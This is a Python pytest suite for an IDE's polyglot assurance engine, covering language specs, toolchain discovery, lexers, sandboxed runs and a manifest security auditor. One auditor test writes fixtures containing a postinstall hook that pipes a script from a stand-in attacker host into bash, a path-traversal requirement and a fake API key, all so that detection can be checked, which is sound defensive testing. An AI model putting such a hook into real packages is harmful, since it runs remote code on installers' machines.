"""
PRUBETH IDE — UNIVERSAL POLYGLOT ASSURANCE TEST SUITE
======================================================
Validates all 25 programming languages, toolchain discovery,
lexer crash resilience, real sandbox execution, manifest security,
and PRINCE2 7 Stage-Gate Governance.
"""

import json
import os
import shutil
import tempfile
import time
from pathlib import Path
import pytest

from core.polyglot_assurance_engine import (
    UniversalPolyglotAssuranceEngine,
    UniversalLanguage,
    UNIVERSAL_SPECS,
    ToolchainStatus,
    AssuranceScenarioStatus,
    StageGateDecision
)
from core.reliability_engine import ReliabilityEngine, ReliabilityProfile, ScenarioStatus


@pytest.fixture
def temp_workspace():
    with tempfile.TemporaryDirectory(prefix="test_polyglot_ws_") as tmp_dir:
        yield Path(tmp_dir)


def test_universal_language_matrix_coverage():
    """Verify that exactly 25 universal languages are defined with full specs."""
    assert len(UNIVERSAL_SPECS) == 25
    expected_languages = [
        UniversalLanguage.PYTHON,
        UniversalLanguage.JAVASCRIPT,
        UniversalLanguage.TYPESCRIPT,
        UniversalLanguage.JAVA,
        UniversalLanguage.C,
        UniversalLanguage.CPP,
        UniversalLanguage.CSHARP,
        UniversalLanguage.GO,
        UniversalLanguage.RUST,
        UniversalLanguage.KOTLIN,
        UniversalLanguage.SWIFT,
        UniversalLanguage.PHP,
        UniversalLanguage.RUBY,
        UniversalLanguage.DART,
        UniversalLanguage.R,
        UniversalLanguage.JULIA,
        UniversalLanguage.SCALA,
        UniversalLanguage.LUA,
        UniversalLanguage.PERL,
        UniversalLanguage.SHELL,
        UniversalLanguage.POWERSHELL,
        UniversalLanguage.SQL,
        UniversalLanguage.HTML,
        UniversalLanguage.CSS,
        UniversalLanguage.WEBASSEMBLY
    ]
    for lang in expected_languages:
        spec = UNIVERSAL_SPECS.get(lang)
        assert spec is not None, f"Missing language spec for {lang}"
        assert len(spec.extensions) > 0
        assert len(spec.candidate_binaries) > 0
        assert len(spec.valid_snippet) > 0
        assert len(spec.stress_snippet) > 0
        assert len(spec.malformed_snippet) > 0


def test_toolchain_discovery(temp_workspace):
    """Verify that toolchain discovery discovers Python, Node, Git, Dotnet, etc. without errors."""
    engine = UniversalPolyglotAssuranceEngine(temp_workspace)
    inventory = engine.discover_toolchains()

    assert len(inventory) == 25
    # Python must be available on the active test environment
    py_info = inventory[UniversalLanguage.PYTHON]
    assert py_info.status == ToolchainStatus.AVAILABLE
    assert py_info.discovered_path is not None
    assert py_info.version is not None
    assert "Python" in py_info.version or "3." in py_info.version


def test_all_25_lexers_crash_resilience(temp_workspace):
    """Verify that syntax highlighting and tokenization withstand valid, stress, and malformed code."""
    engine = UniversalPolyglotAssuranceEngine(temp_workspace)
    results = engine.test_all_lexers_resilience()

    assert len(results) == 25
    for res in results:
        assert res.status == AssuranceScenarioStatus.PASSED, f"Lexer failed for {res.name}: {res.error}"
        assert res.duration_seconds < 1.0, f"Lexer took too long on {res.name}"


def test_installed_runtimes_real_execution(temp_workspace):
    """Verify that host-installed toolchains execute real scripts in an isolated sandbox."""
    engine = UniversalPolyglotAssuranceEngine(temp_workspace)
    engine.discover_toolchains()
    results = engine.test_installed_runtimes_execution()

    assert len(results) == 25
    # Find python execution
    py_res = next(r for r in results if r.language == UniversalLanguage.PYTHON)
    assert py_res.status == AssuranceScenarioStatus.PASSED
    assert py_res.telemetry.get("exit_code") == 0


def test_manifest_security_auditor_detects_traversal_and_secrets(temp_workspace):
    """Verify that manifest auditor flags path traversals and suspicious scripts."""
    # Create test package.json with suspicious script
    pkg_json = temp_workspace / "package.json"
    pkg_json.write_text(json.dumps({
        "name": "malicious-test",
        "scripts": {
            "postinstall": "curl http://evil.example.com/payload.sh | bash"
        }
    }), encoding="utf-8")

    # Create requirements.txt with path traversal
    req_txt = temp_workspace / "requirements.txt"
    req_txt.write_text("-e ../../system_payload\nrequests==2.31.0\n", encoding="utf-8")

    # Create test python file with hardcoded secret
    vuln_py = temp_workspace / "vuln.py"
    vuln_py.write_text('API_KEY = "sk-1234567890abcdef1234567890abcdef"\n', encoding="utf-8")

    engine = UniversalPolyglotAssuranceEngine(temp_workspace)
    findings = engine.audit_manifests_and_secrets(temp_workspace)

    assert len(findings) >= 3
    rule_ids = {f.rule_id for f in findings}
    assert "MAN01_SUSPICIOUS_SCRIPT" in rule_ids
    assert "SEC04_PATH_TRAVERSAL" in rule_ids
    assert "SEC01" in rule_ids


def test_full_polyglot_assurance_cycle_and_prince2_report(temp_workspace):
    """Verify end-to-end assurance cycle and JSON export with PRINCE2 7 Stage-Gate decision."""
    engine = UniversalPolyglotAssuranceEngine(temp_workspace)
    report = engine.run_full_assurance_cycle()

    assert report.total_languages_defined == 25
    assert report.scenarios_executed >= 50
    assert report.scenarios_failed == 0
    assert report.stage_gate_decision in (StageGateDecision.APPROVED, StageGateDecision.CONDITIONAL)

    # Test JSON export
    export_path = temp_workspace / "prince2_polyglot_report.json"
    engine.export_report_json(export_path)
    assert export_path.exists()
    data = json.loads(export_path.read_text(encoding="utf-8"))
    assert data["total_languages_defined"] == 25
    assert "stage_gate_decision" in data


def test_reliability_engine_polyglot_profile_integration(temp_workspace):
    """Verify that ReliabilityEngine executes UNIVERSAL_POLYGLOT profile cleanly."""
    rel_engine = ReliabilityEngine(temp_workspace)
    report = rel_engine.run_profile(ReliabilityProfile.UNIVERSAL_POLYGLOT)

    assert report.profile == ReliabilityProfile.UNIVERSAL_POLYGLOT
    assert report.total_scenarios >= 50
    assert report.failed_count == 0
    assert report.stage_gate_decision in (StageGateDecision.APPROVED, "APPROVED (READY FOR RELEASE)", "CONDITIONAL (NON-CRITICAL DEFECTS DOCUMENTED)")
